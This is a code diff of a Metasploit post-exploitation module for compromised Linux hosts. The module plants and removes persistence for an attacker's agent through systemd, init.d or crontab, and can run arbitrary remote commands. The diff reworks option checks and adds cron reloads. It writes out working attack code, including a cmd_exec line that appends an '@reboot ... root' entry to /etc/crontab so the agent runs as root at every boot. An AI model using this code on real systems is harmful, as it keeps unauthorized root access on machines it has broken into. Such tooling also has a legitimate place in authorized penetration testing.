@@ -144,7 +144,6 @@ class MetasploitModule < Msf::Post
                                 OptString.new('SESSION', [ true, 'The session number to run this module on', 1]),
                                 OptBool.new('SYSTEMD', [ false, 'Use systemd to persiste our payload?' , false]),
                                 OptBool.new('CRONTAB', [ false, 'Use crontab to persiste our payload?' , false]),
-                                OptString.new('START_TIME', [ false, 'Time to wait for the agent to start (in seconds)', 8]),
                                 OptString.new('REMOTE_PATH', [ false, 'The absoluct path of binary to execute (eg /root/agent.sh)'])
                         ], self.class)
 
@@ -155,6 +154,7 @@ class MetasploitModule < Msf::Post
                                 OptString.new('RPATH_SYSTEMD', [ false, 'The absoluct path of systemd directory']),
                                 OptBool.new('SHEBANG', [ false, 'Use agents with [shebang]? (eg #!/bin/sh)' , false]),
                                 OptString.new('SINGLE_COM', [ false, 'Execute one simple bash command (eg uname -a)']),
+                                OptString.new('START_TIME', [ false, 'Time to wait for the agent to start (in seconds)', 8]),
                                 OptBool.new('DEL_PERSISTENCE', [ false, 'Delete persistence scripts/configurations?' , false])
                         ], self.class) 
 
@@ -171,15 +171,6 @@ def ls_stage1
   sysnfo = session.sys.config.sysinfo
   stime = datastore['START_TIME'] # 8 (sec to start the agent)
   remote_path = datastore['REMOTE_PATH'] # /root/agent
-  #
-  # check for proper config settings enter
-  # to prevent 'unset all' from deleting default options ..
-  #
-  if datastore['SESSION'] == 'nil' || datastore['REMOTE_PATH'] == 'nil'
-    print_error("Options not configurated correctly.")
-    print_warning("Please set SESSION | REMOTE_PATH options.")
-    return nil
-  end
 
 
 
@@ -187,6 +178,13 @@ def ls_stage1
 # Using systemd service creation
 # ---------------------------------------------------
 if datastore['SYSTEMD'] == true && datastore['DEL_PERSISTENCE'] == false
+
+# make sure all options needed by this fuction are set
+if datastore['RPATH_SYSTEMD'] == 'nil' || datastore['REMOTE_PATH'] == 'nil'
+  print_error("[ERROR] set REMOTE_PATH | RPATH_SYSTEMD options before comtinue.")
+  return nil
+end
+
 
 # prevent other pesistence functions from runing.
 if datastore['INITD'] == true || datastore['CRONTAB'] == true
@@ -272,6 +270,13 @@ end
 # use init.d service creation
 # ---------------------------------------------------
 if datastore['INITD'] == true && datastore['DEL_PERSISTENCE'] == false
+
+# make sure all options needed by this fuction are set
+if datastore['REMOTE_PATH'] == 'nil' || datastore['INIT_PATH'] == 'nil'
+  print_error("[ERROR] set REMOTE_PATH | INIT_PATH options before comtinue.")
+  return nil
+end
+
 
 # prevent other pesistence functions from runing.
 if datastore['SYSTEMD'] == true || datastore['CRONTAB'] == true
@@ -397,6 +402,13 @@ end
 # ---------------------------------------------------
 if datastore['CRONTAB'] == true && datastore['DEL_PERSISTENCE'] == false
 
+# make sure all options needed by this fuction are set
+if datastore['REMOTE_PATH'] == 'nil' || datastore['CRON_PATH'] == 'nil'
+  print_error("[ERROR] set REMOTE_PATH | CRON_PATH options before comtinue.")
+  return nil
+end
+
+
 # prevent other pesistence functions from runing.
 if datastore['INITD'] == true || datastore['SYSTEMD'] == true
   print_error("[ERROR] unset INITD and SYSTEMD")
@@ -407,7 +419,7 @@ print_status("Persist: #{remote_path} on #{sysnfo['Computer']}")
 Rex::sleep(1.0)
 
     #
-    # Check if crontab dir exists ..
+    # Check if crontab file exists ..
     #
     sysnfo = session.sys.config.sysinfo
     serv_file = datastore['CRON_PATH'] # /etc/crontab
@@ -431,9 +443,11 @@ Rex::sleep(1.0)
       #
       # This is the crontab command that provides persistence on startup ..
       #
-      print_status("Writing crontab schedule task (on reboot).")
+      print_status("Writing crontab schedule task (@reboot).")
       Rex::sleep(1.0)
+      print_status("Executing: echo \"@reboot \\* \\* \\* \\* root #{remote_path}\" >> #{serv_file}")
       cmd_exec("echo \"@reboot * * * * root #{remote_path}\" >> #{serv_file}")
+      Rex::sleep(1.0)
       print_status("Reloading crontab daemon.")
       cmd_exec("service cron reload")
       Rex::sleep(1.0)
@@ -466,18 +480,8 @@ def ls_stage2
 
   session = client
   sysnfo = session.sys.config.sysinfo
-  #
-  # check for proper config settings enter
-  # to prevent 'unset all' from deleting default options ..
-  #
-  if datastore['SESSION'] == 'nil' || datastore['DEL_PERSISTENCE'] == 'nil'
-    print_error("Options not configurated correctly.")
-    print_warning("Please set SESSION | DEL_PERSISTENCE options.")
-    return nil
-  else
-    print_status("Deleting persistence schedules.")
-    Rex::sleep(1.0)
-  end
+  print_status("Deleting persistence schedules.")
+  Rex::sleep(1.0)
 
 
 
@@ -485,6 +489,13 @@ def ls_stage2
 # Deleting systemd service persistence schedules
 # ---------------------------------------------------
 if datastore['SYSTEMD'] == true && datastore['DEL_PERSISTENCE'] == true
+
+# make sure all options needed by this fuction are set
+if datastore['RPATH_SYSTEMD'] == 'nil'
+  print_error("[ERROR] set RPATH_SYSTEMD options before comtinue.")
+  return nil
+end
+
 
 # prevent other pesistence functions from runing.
 if datastore['INITD'] == true || datastore['CRONTAB'] == true
@@ -538,6 +549,13 @@ end
 # ---------------------------------------------------
 if datastore['INITD'] == true && datastore['DEL_PERSISTENCE'] == true
 
+# make sure all options needed by this fuction are set
+if datastore['INIT_PATH'] == 'nil'
+  print_error("[ERROR] set INIT_PATH options before comtinue.")
+  return nil
+end
+
+
 # prevent other pesistence functions from runing.
 if datastore['SYSTEMD'] == true || datastore['CRONTAB'] == true
   print_error("[ERROR] unset SYSTEMD and CRONTAB")
@@ -589,6 +607,13 @@ end
 # ---------------------------------------------------
 if datastore['CRONTAB'] == true && datastore['DEL_PERSISTENCE'] == true
 
+# make sure all options needed by this fuction are set
+if datastore['REMOTE_PATH'] == 'nil' || datastore['CRON_PATH'] == 'nil'
+  print_error("[ERROR] set REMOTE_PATH | CRON_PATH options before comtinue.")
+  return nil
+end
+
+
 # prevent other pesistence functions from runing.
 if datastore['INITD'] == true || datastore['SYSTEMD'] == true
   print_error("[ERROR] unset INITD and SYSTEMD")
@@ -614,12 +639,16 @@ end
       Rex::sleep(1.0)
       print_status("Agent absoluct path: #{remote_path}")
       Rex::sleep(1.0)
-      print_status("Executing: sed -i \\'s|@reboot \\\\* \\\\* \\\\* \\\\* root [remote_path]||\\' #{serv_file}")
+      print_status("Executing: sed -i \"s|@reboot \\* \\* \\* \\* root #{remote_path}||\" #{serv_file}")
       # we need to escape * because sed see them as special chars.
       cmd_exec("sed -i \"s|@reboot \* \* \* \* root #{remote_path}||\" #{serv_file}")
       # we need to escape the remote_path var because sed command uses /// as command separator
       # parse = app_path.gsub('/', '\/')
       # session.shell_command("sed -i 's|@reboot \* \* \* \* root #{parse}||' /etc/crontab")
+      print_status("Reloading crontab daemon.")
+      cmd_exec("service cron reload")
+      Rex::sleep(1.0)
+
 
   # Final displays to user ..
   print_good("Persistence deleted from: #{sysnfo['Computer']}")
@@ -646,22 +675,18 @@ def ls_stage3
   session = client
   sysnfo = session.sys.config.sysinfo
   exe_com = datastore['SINGLE_COM']  # uname -a
-  #
-  # check for proper config settings enter
-  # to prevent 'unset all' from deleting default options ..
-  #
-  if datastore['SESSION'] == 'nil' || datastore['SINGLE_COM'] == 'nil'
-    print_error("Options not configurated correctly.")
-    print_warning("Please set SESSION | SINGLE_COM options.")
+
+  # make sure all options needed by this fuction are set
+  if datastore['SINGLE_COM'] == 'nil'
+    print_error("[ERROR] set SINGLE_COM option before comtinue.")
     return nil
-  else
-    print_status("Executing remote bash command.")
-    Rex::sleep(1.0)
   end
 
       #
       # msf API call to execute bash command remotelly  ..
       #
+      print_status("Executing remote bash command.")
+      Rex::sleep(1.0)
       print_good("Executing: #{exe_com}")
       Rex::sleep(1.0)
       output = cmd_exec("#{exe_com}")
